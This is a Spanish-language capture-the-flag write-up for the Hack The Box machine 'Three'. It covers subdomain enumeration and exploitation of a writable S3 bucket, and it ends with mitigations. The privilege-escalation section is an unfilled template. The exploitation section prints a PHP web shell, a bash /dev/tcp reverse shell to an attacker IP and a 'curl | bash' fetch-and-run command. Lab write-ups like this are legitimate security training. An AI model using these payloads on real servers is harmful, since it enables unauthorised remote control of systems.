# Three — HTB

**Plataforma:** Hack The Box
**Dificultad:** Fácil
**Categoría:** Web / Cloud / RCE

---

## 1. 🔎 Reconocimiento

### Nmap

```bash
nmap -sCV -p- -Pn 10.129.161.108
```

Escaneamos todos los puertos TCP y obtenemos:

* `22/tcp` → SSH
* `80/tcp` → HTTP — Apache

Durante la enumeración web encontramos el dominio utilizado por la aplicación:

```text
thetoppers.htb
```

Lo añadimos a `/etc/hosts`:

```text
10.129.161.108 thetoppers.htb
```

### Enumeración de directorios

```bash
ffuf -u http://10.129.161.108/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Encontramos:

```text
/index.php
```

Al acceder a la página observamos información relacionada con el dominio utilizado por el servidor.

### Enumeración de subdominios

Primero obtenemos el tamaño de la respuesta normal:

```bash
tgt_size=$(curl -s http://thetoppers.htb | wc -c)
```

Después utilizamos `ffuf` modificando el header `Host`:

```bash
ffuf -c \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb \
-H "Host: FUZZ.thetoppers.htb" \
-fs $tgt_size \
-mc all
```

El filtro `-fs` permite eliminar las respuestas cuyo tamaño coincide con la respuesta normal, facilitando la identificación de subdominios reales.

Encontramos:

```text
s3.thetoppers.htb
```

Lo añadimos también a `/etc/hosts`:

```text
10.129.161.108 s3.thetoppers.htb
```

---

## 2. 📋 Enumeración

### Subdominio S3

Realizamos un nuevo escaneo:

```bash
nmap -sCV -p- -Pn s3.thetoppers.htb
```

Encontramos:

* `22/tcp` → SSH
* `80/tcp` → HTTP — Amazon S3 Web Service

El servicio corresponde a un sistema de almacenamiento de objetos compatible con **Amazon S3**.

### AWS CLI

Instalamos AWS CLI:

```bash
sudo apt install awscli
```

Configuramos unas credenciales temporales:

```bash
aws configure
```

Utilizamos `temp` como valor en los campos solicitados.

Podemos listar los buckets mediante:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

Encontramos el bucket:

```text
thetoppers.htb
```

Para listar su contenido:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

---

## 3. 💥 Explotación

### RCE mediante S3

Comprobamos que podemos subir archivos al bucket.

Creamos una web shell en PHP:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Subimos el archivo:

```bash
aws --endpoint=http://s3.thetoppers.htb \
s3 cp shell.php s3://thetoppers.htb
```

El archivo queda accesible desde la aplicación web:

```text
http://thetoppers.htb/shell.php
```

Podemos ejecutar comandos mediante el parámetro `cmd`:

```text
http://thetoppers.htb/shell.php?cmd=<COMANDO>
```

Esto nos proporciona **Remote Code Execution (RCE)** sobre el servidor.

### Reverse Shell

Para obtener una shell interactiva creamos `shell.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.173/1337 0>&1
```

Ponemos nuestra máquina a la escucha:

```bash
nc -nvlp 1337
```

Creamos un servidor HTTP para servir `shell.sh`:

```bash
python3 -m http.server 8000
```

Finalmente ejecutamos desde la web shell:

```text
http://thetoppers.htb/shell.php?cmd=curl 10.10.14.173:8000/shell.sh|bash
```

El proceso es:

1. El servidor víctima ejecuta `curl`.
2. `curl` descarga `shell.sh` desde nuestra máquina por el puerto `8000`.
3. La tubería `|` pasa el contenido descargado a `bash`.
4. `bash` ejecuta el script.
5. El script establece una conexión TCP inversa hacia nuestra máquina en el puerto `1337`.

Recibimos la conexión en:

```bash
nc -nvlp 1337
```

Obteniendo así una **reverse shell** sobre el servidor.

---

## 4. ⬆️ Escalada de privilegios

### Enumeración

<Continuar aquí con la enumeración del sistema una vez obtenida la reverse shell.>

```bash
whoami
id
sudo -l
```

### Vector de escalada

<Documentar aquí el método utilizado para conseguir privilegios elevados.>

### Explotación

```bash
<comando>
```

---

## 5. 📄 Reporte

### Resumen

Durante la explotación de la máquina **Three** se identificó una infraestructura web asociada a un servicio de almacenamiento compatible con Amazon S3.

La enumeración permitió descubrir el subdominio `s3.thetoppers.htb` y acceder al bucket `thetoppers.htb`. Debido a que era posible subir archivos al bucket, se consiguió desplegar una web shell PHP y ejecutar comandos remotamente.

Posteriormente se utilizó esta capacidad para descargar y ejecutar una reverse shell, obteniendo acceso interactivo al servidor.

### Vulnerabilidades encontradas

| Vulnerabilidad                                           | Severidad | Impacto                                      |
| -------------------------------------------------------- | --------- | -------------------------------------------- |
| Bucket S3 con permisos de escritura                      | Alta      | Permite subir archivos al almacenamiento web |
| Ejecución de PHP mediante archivo subido                 | Crítica   | Permite RCE                                  |
| Ausencia de restricciones adecuadas en el almacenamiento | Alta      | Facilita el compromiso del servidor          |

### Mitigaciones

* Restringir los permisos de escritura de los buckets S3.
* Aplicar el principio de mínimo privilegio.
* Evitar que archivos subidos por usuarios puedan ejecutarse como código.
* Validar y restringir las extensiones de archivos permitidas.
* Separar el almacenamiento de objetos del contenido ejecutable de la aplicación.
* Monitorizar subidas y modificaciones de archivos sospechosas.

---

## 🧠 Lessons Learned

* `ffuf` puede utilizarse para descubrir **virtual hosts/subdominios** modificando el header `Host`.
* `-fs` permite filtrar respuestas por tamaño cuando las respuestas inexistentes devuelven contenido idéntico.
* AWS CLI puede interactuar con servicios compatibles con S3 utilizando `--endpoint`.
* Un bucket S3 con permisos de escritura puede convertirse en un vector de ataque si su contenido se sirve directamente desde una aplicación web.
* Una web shell PHP permite ejecutar comandos remotamente mediante parámetros HTTP.
* `curl URL | bash` permite descargar un script y pasarlo directamente a Bash para su ejecución.
* `0>&1` forma parte de la redirección de descriptores necesaria para conseguir una reverse shell interactiva.
